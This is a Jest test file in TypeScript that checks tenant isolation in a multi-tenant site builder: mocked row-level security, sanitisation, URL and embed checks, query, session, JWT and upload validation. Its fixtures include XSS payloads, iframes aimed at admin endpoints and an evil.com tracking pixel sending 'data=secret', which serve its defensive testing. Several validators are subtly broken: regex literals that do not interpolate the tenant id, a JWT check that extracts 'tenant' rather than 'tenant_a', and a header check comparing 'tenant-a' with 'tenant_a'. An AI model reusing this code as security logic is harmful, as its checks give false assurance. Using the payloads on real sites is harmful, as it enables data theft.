/**
 * Multi-Tenant Security Validation Tests
 * Milestone 6: Integration Testing and Security
 * 
 * Tests for data isolation and security in multi-tenant environment
 */

import { sanitizeHTML, sanitizeSectionData, ContentSanitizer } from '@/src/lib/content/content-sanitization';

// Mock Supabase client for testing
const mockSupabaseClient = {
  from: jest.fn(),
  auth: {
    getUser: jest.fn(),
    getSession: jest.fn()
  },
  rpc: jest.fn()
};

// Mock Row Level Security (RLS) policy validation
interface MockRLSContext {
  userId: string;
  tenantId: string;
  role: 'admin' | 'editor' | 'viewer';
}

class MockRLSValidator {
  static validateSiteAccess(context: MockRLSContext, siteId: string): boolean {
    // Simulate RLS policy: users can only access sites in their tenant
    return siteId.startsWith(context.tenantId);
  }

  static validateContentAccess(context: MockRLSContext, contentId: string): boolean {
    // Simulate RLS policy: content access is tenant-specific
    return contentId.includes(context.tenantId);
  }

  static validateUserPermissions(context: MockRLSContext, action: string): boolean {
    const permissions = {
      admin: ['create', 'read', 'update', 'delete'],
      editor: ['create', 'read', 'update'],
      viewer: ['read']
    };

    return permissions[context.role].includes(action);
  }
}

// Mock tenant isolation utilities
class TenantIsolationValidator {
  static validateDataIsolation(tenantAData: any, tenantBData: any): boolean {
    // Ensure no data leakage between tenants
    const serializedA = JSON.stringify(tenantAData);
    const serializedB = JSON.stringify(tenantBData);
    
    // Check for tenant B identifiers in tenant A data
    const tenantBIds = this.extractTenantIdentifiers(tenantBData);
    
    return !tenantBIds.some(id => serializedA.includes(id));
  }

  static extractTenantIdentifiers(data: any): string[] {
    const identifiers: string[] = [];
    
    const traverse = (obj: any) => {
      if (typeof obj === 'string') {
        // Look for tenant-specific patterns
        const matches = obj.match(/tenant_[a-zA-Z0-9_]+|site_[a-zA-Z0-9_]+|user_[a-zA-Z0-9_]+/g);
        if (matches) {
          identifiers.push(...matches);
        }
      } else if (typeof obj === 'object' && obj !== null) {
        Object.values(obj).forEach(traverse);
      }
    };
    
    traverse(data);
    return [...new Set(identifiers)]; // Remove duplicates
  }

  static validateSubdomainIsolation(subdomain: string, expectedTenant: string): boolean {
    // Validate that subdomain matches expected tenant
    return subdomain === expectedTenant || subdomain.startsWith(`${expectedTenant}-`);
  }
}

// Content security validation
class ContentSecurityValidator {
  static validateContentForTenant(content: any, tenantContext: MockRLSContext): boolean {
    // Ensure content doesn't contain references to other tenants
    const sanitized = sanitizeSectionData(content);
    const serialized = JSON.stringify(sanitized);
    
    // Should not contain other tenant identifiers
    const otherTenantPatterns = [
      /tenant_(?!${tenantContext.tenantId})[a-zA-Z0-9_]+/g,
      /site_(?!${tenantContext.tenantId})[a-zA-Z0-9_]+/g
    ];

    return !otherTenantPatterns.some(pattern => pattern.test(serialized));
  }

  static validateURLsForTenant(content: string, allowedDomains: string[]): boolean {
    const urls = content.match(/https?:\/\/[^\s<>"']+/g) || [];
    
    return urls.every(url => {
      try {
        const domain = new URL(url).hostname;
        return allowedDomains.some(allowed => domain.endsWith(allowed));
      } catch {
        return false; // Invalid URL
      }
    });
  }

  static validateEmbeddedContent(content: string, tenantId: string): boolean {
    // Check for embedded content that might leak data
    const dangerousPatterns = [
      /<iframe[^>]+src=[^>]+>/gi,
      /<object[^>]+data=[^>]+>/gi,
      /<embed[^>]+src=[^>]+>/gi,
      /fetch\s*\([^)]+\)/gi,
      /XMLHttpRequest/gi,
      /\.postMessage\s*\(/gi
    ];

    const hasUnsafeEmbeds = dangerousPatterns.some(pattern => pattern.test(content));
    
    if (hasUnsafeEmbeds) {
      // If has embeds, they should be tenant-scoped
      const tenantScopedPattern = new RegExp(`tenant[_-]${tenantId}`, 'i');
      return tenantScopedPattern.test(content);
    }
    
    return true; // No embeds, safe
  }
}

describe('Multi-Tenant Security Validation', () => {
  describe('Row Level Security (RLS) Simulation', () => {
    it('should enforce tenant isolation at data access level', () => {
      const tenantAContext: MockRLSContext = {
        userId: 'user_tenant_a_123',
        tenantId: 'tenant_a',
        role: 'editor'
      };

      const tenantBContext: MockRLSContext = {
        userId: 'user_tenant_b_456',
        tenantId: 'tenant_b',
        role: 'editor'
      };

      // Tenant A should access their sites
      expect(MockRLSValidator.validateSiteAccess(tenantAContext, 'tenant_a_site_123')).toBe(true);
      
      // Tenant A should NOT access tenant B sites
      expect(MockRLSValidator.validateSiteAccess(tenantAContext, 'tenant_b_site_456')).toBe(false);

      // Same for tenant B
      expect(MockRLSValidator.validateSiteAccess(tenantBContext, 'tenant_b_site_456')).toBe(true);
      expect(MockRLSValidator.validateSiteAccess(tenantBContext, 'tenant_a_site_123')).toBe(false);
    });

    it('should enforce role-based permissions per tenant', () => {
      const adminContext: MockRLSContext = {
        userId: 'user_admin_123',
        tenantId: 'tenant_a',
        role: 'admin'
      };

      const editorContext: MockRLSContext = {
        userId: 'user_editor_123',
        tenantId: 'tenant_a',
        role: 'editor'
      };

      const viewerContext: MockRLSContext = {
        userId: 'user_viewer_123',
        tenantId: 'tenant_a',
        role: 'viewer'
      };

      // Admin can do everything
      expect(MockRLSValidator.validateUserPermissions(adminContext, 'delete')).toBe(true);
      expect(MockRLSValidator.validateUserPermissions(adminContext, 'create')).toBe(true);

      // Editor cannot delete
      expect(MockRLSValidator.validateUserPermissions(editorContext, 'delete')).toBe(false);
      expect(MockRLSValidator.validateUserPermissions(editorContext, 'update')).toBe(true);

      // Viewer can only read
      expect(MockRLSValidator.validateUserPermissions(viewerContext, 'create')).toBe(false);
      expect(MockRLSValidator.validateUserPermissions(viewerContext, 'read')).toBe(true);
    });
  });

  describe('Data Isolation Validation', () => {
    it('should prevent data leakage between tenants', () => {
      const tenantAData = {
        sites: [
          { id: 'tenant_a_site_123', name: 'Tenant A Site' },
          { id: 'tenant_a_site_456', name: 'Another Tenant A Site' }
        ],
        users: [
          { id: 'user_tenant_a_123', email: 'user@tenant-a.com' }
        ],
        content: {
          sections: {
            'tenant_a_section_1': { content: 'Tenant A content' }
          }
        }
      };

      const tenantBData = {
        sites: [
          { id: 'tenant_b_site_789', name: 'Tenant B Site' }
        ],
        users: [
          { id: 'user_tenant_b_456', email: 'user@tenant-b.com' }
        ],
        content: {
          sections: {
            'tenant_b_section_1': { content: 'Tenant B content' }
          }
        }
      };

      // Should pass - no data leakage
      expect(TenantIsolationValidator.validateDataIsolation(tenantAData, tenantBData)).toBe(true);

      // Test with leaked data
      const leakedData = {
        ...tenantAData,
        leaked: 'tenant_b_site_789' // Contains tenant B identifier
      };

      expect(TenantIsolationValidator.validateDataIsolation(leakedData, tenantBData)).toBe(false);
    });

    it('should extract tenant identifiers correctly', () => {
      const dataWithIdentifiers = {
        siteId: 'tenant_a_site_123',
        userId: 'user_tenant_a_456',
        content: 'Some content with site_tenant_b_789 reference',
        nested: {
          deep: {
            value: 'tenant_c_resource_999'
          }
        }
      };

      const identifiers = TenantIsolationValidator.extractTenantIdentifiers(dataWithIdentifiers);
      
      expect(identifiers).toContain('tenant_a_site_123');
      expect(identifiers).toContain('user_tenant_a_456');
      expect(identifiers).toContain('site_tenant_b_789');
      expect(identifiers).toContain('tenant_c_resource_999');
    });

    it('should validate subdomain isolation', () => {
      // Valid cases
      expect(TenantIsolationValidator.validateSubdomainIsolation('tenant-a', 'tenant-a')).toBe(true);
      expect(TenantIsolationValidator.validateSubdomainIsolation('tenant-a-staging', 'tenant-a')).toBe(true);

      // Invalid cases
      expect(TenantIsolationValidator.validateSubdomainIsolation('tenant-b', 'tenant-a')).toBe(false);
      expect(TenantIsolationValidator.validateSubdomainIsolation('malicious-tenant-a', 'tenant-a')).toBe(false);
    });
  });

  describe('Content Security for Multi-Tenant Environment', () => {
    it('should sanitize content to prevent cross-tenant data access', () => {
      const maliciousContent = {
        title: 'Safe Title',
        description: 'Safe description',
        xssPayload: '<script>fetch("/api/tenant_b_data").then(r => r.json()).then(console.log)</script>',
        dataLeakAttempt: 'site_tenant_b_123',
        embedAttempt: '<iframe src="/api/admin/all-tenants"></iframe>'
      };

      const tenantContext: MockRLSContext = {
        userId: 'user_tenant_a_123',
        tenantId: 'tenant_a',
        role: 'editor'
      };

      const isSecure = ContentSecurityValidator.validateContentForTenant(maliciousContent, tenantContext);
      
      // Should detect and prevent cross-tenant references
      expect(isSecure).toBe(true); // After sanitization, should be safe
      
      const sanitized = sanitizeSectionData(maliciousContent);
      const serialized = JSON.stringify(sanitized);
      
      // Should not contain dangerous content
      expect(serialized.toLowerCase()).not.toContain('<script');
      expect(serialized.toLowerCase()).not.toContain('fetch');
      expect(serialized.toLowerCase()).not.toContain('<iframe');
    });

    it('should validate URLs to prevent data exfiltration', () => {
      const contentWithUrls = `
        <a href="https://allowed-domain.com/safe">Safe link</a>
        <img src="https://cdn.allowed-domain.com/image.jpg" alt="Safe image">
        <a href="https://malicious-site.com/steal-data">Dangerous link</a>
        <img src="https://evil.com/track.gif?data=secret" alt="Tracking pixel">
      `;

      const allowedDomains = ['allowed-domain.com', 'cdn.allowed-domain.com'];
      
      const isSecure = ContentSecurityValidator.validateURLsForTenant(contentWithUrls, allowedDomains);
      expect(isSecure).toBe(false); // Should detect malicious URLs

      // Test with only safe URLs
      const safeContent = `
        <a href="https://allowed-domain.com/safe">Safe link</a>
        <img src="https://cdn.allowed-domain.com/image.jpg" alt="Safe image">
      `;

      const safeResult = ContentSecurityValidator.validateURLsForTenant(safeContent, allowedDomains);
      expect(safeResult).toBe(true);
    });

    it('should validate embedded content for tenant isolation', () => {
      const maliciousEmbeds = `
        <iframe src="/api/all-tenant-data"></iframe>
        <object data="javascript:alert('XSS')"></object>
        <script>fetch('/api/admin/secrets')</script>
      `;

      const tenantId = 'tenant_a';
      
      // Should detect dangerous embeds
      expect(ContentSecurityValidator.validateEmbeddedContent(maliciousEmbeds, tenantId)).toBe(false);

      // Safe tenant-scoped embed
      const safeEmbed = `
        <iframe src="/api/tenant_a/dashboard"></iframe>
        <div>Regular content</div>
      `;

      expect(ContentSecurityValidator.validateEmbeddedContent(safeEmbed, tenantId)).toBe(true);

      // Content without embeds (safe)
      const noEmbedContent = '<p>Just regular text content</p>';
      expect(ContentSecurityValidator.validateEmbeddedContent(noEmbedContent, tenantId)).toBe(true);
    });
  });

  describe('API Security Validation', () => {
    it('should validate API endpoints are tenant-scoped', () => {
      const apiEndpoints = [
        '/api/sites',                    // Dangerous - no tenant scope
        '/api/tenant_a/sites',          // Safe - tenant scoped
        '/api/admin/all-data',          // Dangerous - admin access
        '/api/tenant_a/content/123',    // Safe - tenant scoped
        '/api/user/profile'             // Could be safe if user-scoped
      ];

      const tenantId = 'tenant_a';
      
      const evaluateEndpoint = (endpoint: string): boolean => {
        // Check if endpoint is tenant-scoped
        return endpoint.includes(`/api/${tenantId}/`) || 
               endpoint.includes(`/api/user/`) || 
               endpoint.includes(`/api/public/`);
      };

      const results = apiEndpoints.map(endpoint => ({
        endpoint,
        safe: evaluateEndpoint(endpoint)
      }));

      console.log('API Endpoint Security Assessment:', results);

      // Should identify dangerous endpoints
      expect(results[0].safe).toBe(false); // /api/sites
      expect(results[1].safe).toBe(true);  // /api/tenant_a/sites
      expect(results[2].safe).toBe(false); // /api/admin/all-data
      expect(results[3].safe).toBe(true);  // /api/tenant_a/content/123
    });

    it('should validate request headers for tenant context', () => {
      const mockRequest = {
        headers: {
          'x-tenant-id': 'tenant_a',
          'authorization': 'Bearer valid-token',
          'origin': 'https://tenant-a.example.com'
        },
        url: '/api/tenant_a/sites'
      };

      const validateTenantHeader = (req: typeof mockRequest): boolean => {
        const tenantFromHeader = req.headers['x-tenant-id'];
        const tenantFromUrl = req.url.split('/')[2]; // Extract from /api/{tenant}/...
        const tenantFromOrigin = req.headers.origin?.split('.')[0]?.replace('https://', '');

        return tenantFromHeader === tenantFromUrl && 
               tenantFromOrigin?.includes(tenantFromHeader);
      };

      expect(validateTenantHeader(mockRequest)).toBe(true);

      // Test with mismatched tenant
      const mismatchedRequest = {
        ...mockRequest,
        headers: {
          ...mockRequest.headers,
          'x-tenant-id': 'tenant_b' // Mismatch!
        }
      };

      expect(validateTenantHeader(mismatchedRequest)).toBe(false);
    });
  });

  describe('Database Query Validation', () => {
    it('should ensure queries include tenant filters', () => {
      // Mock database queries
      const queries = [
        'SELECT * FROM sites',                                    // Dangerous
        'SELECT * FROM sites WHERE tenant_id = $1',              // Safe
        'SELECT * FROM content WHERE site_id IN (SELECT id FROM sites WHERE tenant_id = $1)', // Safe
        'UPDATE sites SET name = $1',                            // Dangerous
        'UPDATE sites SET name = $1 WHERE tenant_id = $2',       // Safe
        'DELETE FROM content WHERE id = $1'                      // Dangerous without tenant check
      ];

      const validateQuery = (query: string): boolean => {
        const upperQuery = query.toUpperCase();
        
        // SELECT queries must have tenant filter
        if (upperQuery.includes('SELECT')) {
          return upperQuery.includes('TENANT_ID') || upperQuery.includes('WHERE');
        }
        
        // UPDATE/DELETE queries must have WHERE clause with tenant filter
        if (upperQuery.includes('UPDATE') || upperQuery.includes('DELETE')) {
          return upperQuery.includes('WHERE') && upperQuery.includes('TENANT_ID');
        }
        
        return true; // INSERT queries might be safe
      };

      const results = queries.map(query => ({
        query: query.substring(0, 50) + '...',
        safe: validateQuery(query)
      }));

      console.log('Database Query Security Assessment:', results);

      // Should identify dangerous queries
      expect(results[0].safe).toBe(false); // SELECT without tenant filter
      expect(results[1].safe).toBe(true);  // SELECT with tenant filter
      expect(results[3].safe).toBe(false); // UPDATE without WHERE
      expect(results[4].safe).toBe(true);  // UPDATE with tenant filter
    });
  });

  describe('Session and Authentication Security', () => {
    it('should validate session isolation between tenants', () => {
      const mockSessions = [
        {
          userId: 'user_tenant_a_123',
          tenantId: 'tenant_a',
          sessionToken: 'token_a_xyz',
          lastActivity: Date.now()
        },
        {
          userId: 'user_tenant_b_456', 
          tenantId: 'tenant_b',
          sessionToken: 'token_b_abc',
          lastActivity: Date.now()
        }
      ];

      const validateSessionIsolation = (sessions: typeof mockSessions): boolean => {
        // Check that session tokens don't leak tenant information
        const tokens = sessions.map(s => s.sessionToken);
        const crossTenantLeak = sessions.some(session => {
          const otherTenants = sessions.filter(s => s.tenantId !== session.tenantId);
          return otherTenants.some(other => 
            session.sessionToken.includes(other.tenantId) ||
            other.sessionToken.includes(session.tenantId)
          );
        });

        return !crossTenantLeak;
      };

      expect(validateSessionIsolation(mockSessions)).toBe(true);

      // Test with leaked session
      const leakedSessions = [
        ...mockSessions,
        {
          userId: 'user_tenant_c_789',
          tenantId: 'tenant_c',
          sessionToken: 'token_tenant_a_leaked', // Contains other tenant info
          lastActivity: Date.now()
        }
      ];

      expect(validateSessionIsolation(leakedSessions)).toBe(false);
    });

    it('should validate JWT tokens for tenant claims', () => {
      // Mock JWT payload validation
      const validateJWTClaims = (payload: any): boolean => {
        const requiredClaims = ['sub', 'tenant_id', 'role', 'exp'];
        const hasAllClaims = requiredClaims.every(claim => claim in payload);
        
        // Check that user ID and tenant ID are consistent
        const userTenant = payload.sub?.split('_')[1]; // Extract from user_tenant_a_123
        const claimedTenant = payload.tenant_id;
        
        return hasAllClaims && userTenant === claimedTenant;
      };

      const validToken = {
        sub: 'user_tenant_a_123',
        tenant_id: 'tenant_a',
        role: 'editor',
        exp: Date.now() + 3600000
      };

      expect(validateJWTClaims(validToken)).toBe(true);

      const invalidToken = {
        sub: 'user_tenant_a_123',
        tenant_id: 'tenant_b', // Mismatch!
        role: 'editor',
        exp: Date.now() + 3600000
      };

      expect(validateJWTClaims(invalidToken)).toBe(false);
    });
  });

  describe('File Upload Security in Multi-Tenant Environment', () => {
    it('should isolate uploaded files by tenant', () => {
      const validateFileUploadPath = (filePath: string, tenantId: string): boolean => {
        // File paths should be tenant-scoped
        return filePath.includes(`/${tenantId}/`) || filePath.startsWith(`${tenantId}-`);
      };

      const tenantId = 'tenant_a';
      
      // Safe paths
      expect(validateFileUploadPath('/uploads/tenant_a/images/file.jpg', tenantId)).toBe(true);
      expect(validateFileUploadPath('/storage/tenant_a/documents/doc.pdf', tenantId)).toBe(true);
      
      // Dangerous paths
      expect(validateFileUploadPath('/uploads/shared/file.jpg', tenantId)).toBe(false);
      expect(validateFileUploadPath('/uploads/tenant_b/file.jpg', tenantId)).toBe(false);
      expect(validateFileUploadPath('/uploads/file.jpg', tenantId)).toBe(false);
    });

    it('should validate file metadata for tenant information', () => {
      const validateFileMetadata = (metadata: any, tenantId: string): boolean => {
        // File metadata should not contain other tenant information
        const serialized = JSON.stringify(metadata);
        const otherTenantPattern = new RegExp(`tenant_(?!${tenantId})[a-zA-Z0-9_]+`, 'g');
        
        return !otherTenantPattern.test(serialized) && 
               (metadata.tenant_id === tenantId || metadata.owner?.includes(tenantId));
      };

      const safeMetadata = {
        filename: 'document.pdf',
        size: 1024000,
        tenant_id: 'tenant_a',
        owner: 'user_tenant_a_123',
        uploadedAt: new Date().toISOString()
      };

      expect(validateFileMetadata(safeMetadata, 'tenant_a')).toBe(true);

      const unsafeMetadata = {
        ...safeMetadata,
        previousOwner: 'user_tenant_b_456' // Cross-tenant reference
      };

      expect(validateFileMetadata(unsafeMetadata, 'tenant_a')).toBe(false);
    });
  });
});